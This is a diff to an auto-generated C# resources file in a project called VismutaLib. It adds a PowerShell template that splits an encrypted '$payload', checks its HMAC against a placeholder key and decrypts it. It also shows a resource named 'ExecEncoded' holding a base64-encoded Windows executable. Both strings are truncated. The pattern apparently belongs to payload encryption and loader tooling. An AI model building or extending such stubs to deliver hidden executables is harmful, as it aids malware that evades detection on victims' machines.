@@ -70,6 +70,28 @@ namespace VismutaLib.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized string similar to 
+        ///[string] $key = [[KEY]];
+        ///
+        ///[byte[]] $hash = New-Object Byte[] 64;
+        ///[byte[]] $aead = New-Object Byte[] ($payload.Length - 64);
+        ///[byte[]] $iv = New-Object Byte[] 16;
+        ///[byte[]] $ciphertext = New-Object Byte[] ($aead.Length - 16);
+        ///
+        ///[System.Array]::Copy($payload, 0, $hash, 0, 64);
+        ///[System.Array]::Copy($payload, 64, $aead, 0, $payload.Length - 64);
+        ///
+        ///$hmac = New-Object -TypeName System.Security.Cryptography.HMACSHA512 (, $key);
+        ///$computed = $hmac.ComputeHash($aead);
+        ///If ((diff $hash $computed).Length) { $a [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string AES256Decrypt {
+            get {
+                return ResourceManager.GetString("AES256Decrypt", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized string similar to TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADhWOKrpTmM+KU5jPilOYz4rEEI+I85jPisQRn4tTmM+KxBH/i2OYz4pTmN+G45jPisQQ/4LjmM+LtrGPikOYz4rEEd+KQ5jPhSaWNopTmM+AAAAAAAAAAAAAAAAAAAAABQRQAATAEEAKWDOFMAAAAAAAAAAOAAAwELAQkAAFQCAACaAwAAAAAARZYAAAAQAAAAcAIAAABAAAAQAAAAAgAABQAAAAAAAAAFAAAAAAAAAADQCAAABAAAo0sGAAMAAIAAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOTnAgDIAAAAAOAFAPDqAgAAAAAAAAAAAADyBQDAGgAA [rest of string was truncated]&quot;;.
         /// </summary>
         public static string ExecEncoded {
